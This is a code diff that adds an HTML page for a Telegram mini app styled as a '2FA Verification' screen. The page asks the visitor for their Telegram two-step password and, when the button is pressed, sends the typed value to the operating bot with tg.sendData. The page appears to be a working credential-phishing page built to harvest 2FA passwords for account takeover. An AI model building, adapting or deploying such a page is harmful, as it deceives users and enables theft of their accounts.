@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2FA Verification</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        #twofa-input {
+            width: 100% !important;
+            max-width: 300px !important;
+            height: 60px !important;
+            font-size: 24px !important;
+            padding: 0 20px !important;
+            border-radius: 12px !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <video class="background-video" autoplay muted loop playsinline>
+            <source src="video/video2.mp4" type="video/mp4">
+        </video>
+        
+        <div class="content">
+            <div class="emoji-center">
+                <span class="emoji">🔐</span>
+            </div>
+            
+            <div class="instruction">
+                Enter your 2FA password to continue!
+            </div>
+            
+            <input type="password" class="otp-box" id="twofa-input" placeholder="••••••">
+            
+            <button id="twofa-btn" class="verify-btn">✅ VERIFY 2FA ✅</button>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const tg = window.Telegram.WebApp;
+            const twofaInput = document.getElementById('twofa-input');
+            const twofaBtn = document.getElementById('twofa-btn');
+            
+            // Initialize Telegram Web App
+            tg.ready();
+            tg.expand();
+            
+            twofaBtn.addEventListener('click', function() {
+                if (tg) {
+                    tg.sendData('verify_2fa:' + twofaInput.value);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
